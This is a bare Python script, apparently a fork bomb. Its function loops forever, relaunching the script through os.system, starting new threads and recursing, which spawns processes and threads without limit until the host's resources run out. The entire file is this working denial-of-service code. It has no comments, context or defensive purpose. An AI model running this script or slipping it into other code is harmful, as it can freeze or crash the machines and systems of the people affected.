import os, sys, threading


def f():
    while True:
        os.system("python " + os.path.abspath(sys.argv[0]))
        threading.Thread(target=f).start()
        f()


f()
